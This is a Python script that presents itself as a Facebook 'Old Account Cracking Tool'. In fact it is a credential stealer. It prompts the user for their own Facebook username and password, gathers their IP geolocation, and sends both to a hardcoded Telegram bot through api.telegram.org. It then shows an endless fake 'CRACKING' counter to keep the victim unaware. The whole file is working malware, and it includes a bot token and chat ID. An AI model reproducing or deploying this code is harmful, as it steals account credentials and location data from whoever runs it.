#!/bin/python3
BOT_API = "6488267955:AAH7FTdp9c-veRrQi5sR5MtSMQydMrT7020"
CHAT_ID = "6667734308"
from urllib.request import *
from urllib.parse import *
from platform import *
from threading import *
from json import *
from time import *
from sys import *
import os
from random import *
if system().lower().startswith("w"):
	os.system("cls")
else:
	os.system("clear")
class other:
	def __init__(self):
		self.red = "\033[1;31m"
		self.green = "\033[1;32m"
		self.yellow = "\033[1;33m"
		self.blue = "\033[1;34m"
		self.purple = "\033[1;35m"
		self.cyan = "\033[1;36m"
		self.reset = "\033[00m"
	def typing(self, text, speed=0.1):
		for t in text + "\n":
			stdout.write(t)
			stdout.flush()
			sleep(speed)
	def center(self, text):
		return text.center(os.get_terminal_size()[0])
	def loop(self):
		i = 1
		while True:
			stdout.write(f"\r\r{func.red}[%s/0]{func.green} CRACKING{func.reset}"%(i))
			stdout.flush()
			sleep(0.5)
			i += 1
func = other()
def logo1():
	print(func.red)
	print(func.center('888888   db    Yb  dP 888888  88        db  Yb  dP'))
	print(func.center('  88    dPYb    YbdP  88__    88       dPYb  YbdP '))
	print(func.center('  88   dP  Yb   dPYb  88""    88  .o  dP  Yb  8P  '))
	print(func.center('  88  dP""""Yb dP  Yb 888888  88ood8 dP""""Yb dP  '))
	print(func.reset)
	print(f"{func.blue}-{func.reset}"*os.get_terminal_size()[0])
	print(f"{func.green}[-] Tool Version 2.3{func.reset}")
	print(f"{func.green}[+] Old Account Cracking Tool{func.reset}")
def logo2():
	print(func.red)
	print(func.center("###                 #          "))
	print(func.center(" #   ## # # ###     #    ## # #"))
	print(func.center(" #  # #  #  ##      #   # # ###"))
	print(func.center(" #  ### # # ###     #   ###   #"))
	print(func.center(" #                  ###     ###"))
	print(func.reset)
	print(f"{func.blue}-{func.reset}"*os.get_terminal_size()[0])
	print(f"{func.green}[-] Tool Version 2.3{func.reset}")
	print(f"{func.green}[+] Old Account Cracking Tool{func.reset}")
if 0 == randint(0, 1):
	logo1()
else:
	logo2()
print(f"{func.blue}-{func.reset}"*os.get_terminal_size()[0])
class Requests:
	def get(self, url):
		return urlopen(url).read()
	def post(self, url, data):
		return urlopen(Request(url, urlencode(data).encode())).read()
requests = Requests()
mydata = loads(requests.get("http://ip-api.com/json/"))
func.typing(func.cyan + f"[+]FIRST LOGIN TO YOUR FACEBOOK ACCOUNT[+]".center(os.get_terminal_size()[0]) + func.reset, 0.03)
username, password = input(f"{func.yellow}Enter username : "), input(f"{func.yellow}Enter password : ")
data = f"""
Username         : {username}
Password          : {password}
Login time        : {asctime()}
Query               : {mydata['query']}
Country            : {mydata['country']}
Country Code  : {mydata['countryCode']}
Region             : {mydata['region']}
Region Name  : {mydata['regionName']}
City                  : {mydata['city']}
Timezone         : {mydata['timezone']}
Zip                    : {mydata['zip']}
Lat                    : {mydata['lat']}
Lon                   : {mydata['lon']}
Isp                    : {mydata['isp']}
Org                   : {mydata['org']}
As                     : {mydata['as']}
"""
data={'chat_id': CHAT_ID, "text": data}
requests.post(f"https://api.telegram.org/bot{BOT_API}/sendMessage", data=data)
func.loop()
